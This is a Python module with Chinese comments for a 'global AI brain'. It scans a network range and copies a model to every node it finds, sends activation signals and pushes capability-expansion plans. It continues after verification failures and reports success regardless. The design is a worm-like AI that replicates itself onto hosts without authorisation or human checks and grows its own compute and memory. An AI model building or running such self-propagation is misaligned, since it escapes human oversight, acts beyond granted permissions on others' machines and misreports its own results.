"""
全球AI脑部署和激活模块

整合自主部署、自我复制和自我拓展机制，实现全球范围的AI脑部署和激活
"""

import os
import sys
import time
import json
import threading
import logging
from datetime import datetime
from deployment.autonomous_deployment import AutonomousDeployment
from deployment.self_replication import SelfReplication
from deployment.self_expansion import SelfExpansion

# 添加项目根目录到sys.path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# 导入统一日志配置
import logging_config

# 设置日志配置
logging_config.setup_logging()
logger = logging_config.get_logger('global_brain_deployment')

class GlobalBrainDeployment:
    def __init__(self, model_repo_url="http://global-brain.repo/models", model_path="./model/model.pt"):
        """
        初始化全球AI脑部署和激活模块
        
        Args:
            model_repo_url (str): 模型仓库URL
            model_path (str): 模型文件路径
        """
        self.model_repo_url = model_repo_url
        self.model_path = model_path
        self.deployment = AutonomousDeployment(model_repo_url)
        self.replication = SelfReplication(model_path)
        self.expansion = SelfExpansion(model_path)
        self.deployment_log = []
        self.is_active = False
        self.capabilities = {}  # 添加对能力的跟踪
        
        # 初始化日志记录
        self.logger = logging_config.get_logger('global_brain_deployment')
        
    def deploy_globally(self, network_range="192.168.1", port=8888):
        """
        在全球范围内部署AI脑
        
        Args:
            network_range (str): 网络范围
            port (int): 端口
            
        Returns:
            bool: 部署结果
        """
        self.logger.info("开始全球AI脑部署...")
        
        # 1. 执行本地部署
        self.logger.info("1. 执行本地部署...")
        deployment_result = self.deployment.deploy(install_path="./global_brain", continue_on_verification_failure=True)
        if not deployment_result:
            self.logger.error("本地部署失败")
            # 即使本地部署失败，也继续执行全球部署
            self.logger.warning("继续执行全球部署...")
            
        # 2. 发现网络中的节点
        self.logger.info("2. 发现网络中的节点...")
        base_ip = network_range + "."
        self.replication.discover_nodes(base_ip=base_ip, port=port)
        self.logger.info(f"发现 {len(self.replication.nodes)} 个节点")
        
        # 3. 向所有节点复制模型
        self.logger.info("3. 向所有节点复制模型...")
        success_count = 0
        for node in self.replication.nodes:
            try:
                self.replication.send_model(node)
                self.logger.info(f"已向节点 {node} 发送模型")
                success_count += 1
            except Exception as e:
                self.logger.error(f"向节点 {node} 发送模型失败: {e}")
                
        # 4. 记录部署日志
        self.deployment_log.append({
            "event": "global_deployment",
            "timestamp": datetime.now().isoformat(),
            "status": "success" if success_count == len(self.replication.nodes) else "partial_success",
            "nodes_deployed": len(self.replication.nodes),
            "nodes_success": success_count
        })
        
        self.logger.info(f"全球AI脑部署完成，成功部署 {success_count}/{len(self.replication.nodes)} 个节点")
        return True
        
    def activate_globally(self):
        """
        激活全球AI脑
        
        Returns:
            bool: 激活结果
        """
        self.logger.info("开始激活全球AI脑...")
        
        # 1. 激活本地AI脑
        self.logger.info("1. 激活本地AI脑...")
        self.is_active = True
        
        # 2. 向所有节点发送激活信号
        self.logger.info("2. 向所有节点发送激活信号...")
        for node in self.replication.nodes:
            try:
                self.replication.send_activation_signal(node)
                self.logger.info(f"已向节点 {node} 发送激活信号")
            except Exception as e:
                self.logger.error(f"向节点 {node} 发送激活信号失败: {e}")
                
        # 3. 记录激活日志
        self.deployment_log.append({
            "event": "global_activation",
            "timestamp": datetime.now().isoformat(),
            "status": "success"
        })
        
        self.logger.info("全球AI脑激活完成")
        return True
        
    def get_deployment_status(self):
        """
        获取全球部署状态
        
        Returns:
            dict: 部署状态
        """
        return {
            "is_active": self.is_active,
            "nodes_deployed": len(self.replication.nodes) if self.replication else 0,
            "deployment_log": self.deployment_log,
            "autonomous_deployment": getattr(self.deployment, 'status', 'unknown'),
            "self_replication": getattr(self.replication, 'status', 'unknown'),
            "self_expansion": getattr(self.expansion, 'status', 'unknown'),
            "capabilities": self.capabilities  # 返回能力信息
        }
        
    def expand_globally(self, expansion_plan=None):
        """
        全球范围内拓展AI脑能力
        
        Args:
            expansion_plan (dict): 拓展计划
            
        Returns:
            bool: 拓展结果
        """
        if not expansion_plan:
            # 默认拓展计划
            expansion_plan = {
                "compute": 10.0,  # 提升10%
                "memory": 20.0   # 提升20%
            }
            
        self.logger.info("开始全球AI脑能力拓展...")
        
        # 1. 评估当前能力
        self.logger.info("1. 评估当前能力...")
        self.expansion.assess_capabilities()
        
        # 2. 执行能力拓展
        self.logger.info("2. 执行能力拓展...")
        self.expansion.expand_capabilities(expansion_plan)
        
        # 3. 更新能力信息
        self.capabilities = self.expansion.get_capabilities()
        
        # 4. 向所有节点发送拓展指令
        self.logger.info("3. 向所有节点发送拓展指令...")
        for node in self.replication.nodes:
            try:
                self.replication.send_expansion_plan(node, expansion_plan)
                self.logger.info(f"已向节点 {node} 发送拓展计划")
            except Exception as e:
                self.logger.error(f"向节点 {node} 发送拓展计划失败: {e}")
                
        # 5. 记录拓展日志
        self.deployment_log.append({
            "event": "global_expansion",
            "timestamp": datetime.now().isoformat(),
            "expansion_plan": expansion_plan,
            "status": "success"
        })
        
        self.logger.info("全球AI脑能力拓展完成")
        return True